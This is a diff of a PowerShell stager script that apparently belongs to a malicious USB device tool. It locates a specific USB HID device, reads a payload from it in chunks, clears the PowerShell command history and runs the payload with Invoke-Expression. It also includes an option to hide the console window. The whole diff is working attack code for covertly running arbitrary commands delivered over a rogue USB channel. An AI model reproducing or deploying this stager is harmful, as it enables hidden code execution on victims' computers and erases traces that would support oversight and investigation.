@@ -25,32 +25,34 @@ namespace n {
 "@
 Add-Type -TypeDefinition $cs
 function stage() {
-	[n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6) # change 6 to 0 to hide
-	gwmi Win32_USBControllerDevice|%{[wmi]($_.Dependent)}|where-object{
+	# [n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6) # change 6 to 0 to hide
+	gwmi Win32_USBControllerDevice|%{[wmi]($_.Dependent)}|where {
 		$_.GetPropertyValue("DeviceID") -match ("03EB&PID_2066") -and 
-		($_.GetPropertyValue("Service") -eq $null)} | ForEach-Object {
-		$fn = ("\??\" + $_.GetPropertyValue("DeviceID").ToString().Replace("\", "#") + "#{4d1e55b2-f16f-11cf-88cb-001111000030}")
+		($_.GetPropertyValue("Service") -eq $null)} | % {
+		$fn = ("\??\" + $_.GetPropertyValue("DeviceID").ToString().Replace("\", "#") + "#{4d1e55b2-f16f-11cf-88cb-001111000030}") # Generic HID
+		# $fn = ("\??\" + $_.GetPropertyValue("DeviceID").ToString().Replace("\", "#") + "#{a5dcbf10-6530-11d2-901f-00c04fb951ed}") # Text Printer
 	}
 	$f = [n.w]::o($fn)
-	$b = New-Object Byte[] ($M+1)
-	$r = $f.Read($b, 0, $M+1)
-	if ($b[1] -ge 2) {
-		$e = ($b[2] * 256) + $b[3]
-		$p = ""
-		for ($i=4; $i -lt 2 + $b[1]; $i++) {
-			$p += [char] $b[$i]
-		}
-		$g = $b[1]-2
-		while ($g -lt $e) {
-			$r = $f.Read($b, 0, $M+1)
-			for ($i=2; $i -lt2+ $b[1]; $i++) {
-				$p += [char] $b[$i]
-			}
-			$g += $b[1]
-		}
-		Clear-History
-		Invoke-Expression $p
-	}
+    $g = 0
+    $e = 0
+    $s = New-Object IO.MemoryStream
+    do {
+    	$b = New-Object Byte[] ($M+1)
+        $f.Write($b, 0, $M+1)
+   	    $r = $f.Read($b, 0, $M+1)
+        if ($b[1] -ge 2) {
+            $o = 0
+            if ($e -eq 0) {
+                $e = ($b[2]*256)+$b[3]
+                $o = 2
+            }
+            $s.Write($b, $o+2, $b[1]-$o)
+            $g+=$b[1]-$o
+            [System.Console]::WriteLine([String]::Format("{0} of {1}",$g, $e))
+        }
+    } while ($g -lt $e)
+	clhy
+	IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())
 }
 stage
-Write-Output "Stage finished"
+
